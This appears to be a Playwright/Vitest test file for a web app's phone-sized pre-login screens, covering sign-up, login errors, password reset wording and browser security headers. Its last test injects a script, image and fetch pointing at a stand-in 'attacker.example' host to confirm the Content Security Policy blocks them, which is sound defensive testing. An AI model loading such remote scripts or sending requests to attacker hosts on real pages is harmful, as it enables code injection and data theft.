import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import type { Browser } from 'playwright'
import { APP, fakeSupabase, json, launch, openPhone } from './browser.ts'

// What someone sees before logging in, on a phone. Supabase is a stand-in (see browser.ts).
let browser: Browser
beforeAll(async () => {
  browser = await launch()
})
afterAll(async () => {
  await browser?.close()
})

describe('Welcome', () => {
  it('opens on Sign up, fits a phone screen, and has no errors', async () => {
    const { page, problems } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(APP)
    await expect(page.getByRole('heading', { name: 'Welcome' }).isVisible()).resolves.toBe(true)
    await expect(page.getByRole('button', { name: 'Create profile' }).isVisible()).resolves.toBe(true)
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflow).toBe(0)
    expect(problems).toEqual([])
  })

  it('fills in the code from an invite link', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(`${APP}/?invite=LUNA42`)
    await expect(page.getByLabel('Invitation code (optional)').inputValue()).resolves.toBe('LUNA42')
  })
})

describe('Log in', () => {
  it('explains a wrong password in plain words', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {
      'POST /auth/v1/token': json(400, { code: 'invalid_credentials', message: 'Invalid login credentials' }),
    })
    await page.goto(APP)
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByLabel('Email').fill('alice@example.com')
    await page.getByLabel('Password', { exact: true }).fill('not-my-password')
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByText('That email and password don’t match').waitFor()
  })

  it('“Forgot your password?” never says whether an email has a profile', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, { 'POST /auth/v1/recover': json(200, {}) })
    await page.goto(APP)
    await page.getByRole('button', { name: 'Log in' }).click()
    await page.getByLabel('Email').fill('nobody@example.com')
    await page.getByRole('button', { name: 'Forgot your password?' }).click()
    await page.getByRole('button', { name: /send/i }).click()
    await page.getByText('If there’s a profile for nobody@example.com').waitFor()
  })
})

describe('Sign up', () => {
  it('stops at a mistyped invitation code, before creating anything', async () => {
    const { page } = await openPhone(browser)
    const calls = await fakeSupabase(page, { 'POST /rest/v1/rpc/is_invite_code_valid': json(200, false) })
    await page.goto(APP)
    await page.getByLabel('Email').fill('new@example.com')
    await page.getByLabel('Password', { exact: true }).fill('a-long-password')
    await page.getByLabel('Invitation code (optional)').fill('TYPO')
    await page.getByRole('button', { name: 'Create profile' }).click()
    await page.getByText('That invitation code doesn’t work').waitFor()
    expect(calls).not.toContain('POST /auth/v1/signup')
  })
})

describe('Browser safety settings (vercel.json)', () => {
  it('sends them with every page', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    const response = await page.goto(APP)
    const headers = response!.headers()
    expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
    expect(headers['x-frame-options']).toBe('DENY')
    expect(headers['x-content-type-options']).toBe('nosniff')
  })

  it('blocks scripts, images and requests to other websites', async () => {
    const { page } = await openPhone(browser)
    await fakeSupabase(page, {})
    await page.goto(APP)
    const blocked = await page.evaluate(async () => {
      const seen: string[] = []
      document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective.replace(/-elem$/, '')))
      const s = document.createElement('script')
      s.src = 'https://attacker.example/steal.js'
      document.head.append(s)
      new Image().src = 'https://attacker.example/pixel.gif'
      await fetch('https://attacker.example/send').catch(() => null)
      await new Promise((r) => setTimeout(r, 500))
      return seen.sort()
    })
    expect(blocked).toEqual(['connect-src', 'img-src', 'script-src'])
  })
})
